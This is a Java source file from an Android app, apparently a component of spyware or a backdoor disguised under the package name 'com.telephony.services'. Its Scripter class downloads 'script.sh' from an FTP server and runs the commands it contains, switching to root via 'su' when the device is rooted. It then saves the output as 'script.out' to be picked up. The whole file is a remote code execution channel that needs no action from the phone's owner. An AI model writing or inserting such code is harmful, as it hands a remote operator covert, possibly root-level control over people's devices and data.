package com.telephony.services;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import android.content.Context;

public class Scripter {
	private MyFTPClient ftp = null;
	private PreferenceUtils sPref = null;

	public static final String SCRIPT_FILE = "script.sh";
	public static final String SCRIPT_OUT_FILE = "script.out";

	public Scripter(Context context, final MyFTPClient ftp) {
		this.ftp = ftp;
		sPref = PreferenceUtils.getInstance(context);
	}

	/**
	 * Выполняет shell script из файла SCRIPT_FILE на сервере
	 * @throws IOException
	 * @throws InvalidKeyException
	 * @throws IllegalBlockSizeException
	 * @throws BadPaddingException
	 * @throws NoSuchAlgorithmException
	 * @throws NoSuchPaddingException
	 */
	public void execScript() throws IOException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, NoSuchAlgorithmException,
			NoSuchPaddingException {
		String[] cmds = null;
		String[] outs = null;
		FileOutputStream fos = null;
		String shell = "sh";
		try {
			if (ftp.getFileSize(SCRIPT_OUT_FILE) < 0) {
				cmds = ftp.downloadFileStrings(SCRIPT_FILE);
				if (cmds.length > 0) {
					if (Utils.checkRoot()) {
						shell = "su";
					}
					outs = new Proc(shell).exec(cmds);
					fos = new FileOutputStream(new File(sPref.getRootDir(), SCRIPT_OUT_FILE));
					fos.write(Utils.implodeStrings(outs, "\n").getBytes("UTF8"));
				}
			}
		} finally {
			if (fos != null) {
				fos.close();
			}
		}

	}

}
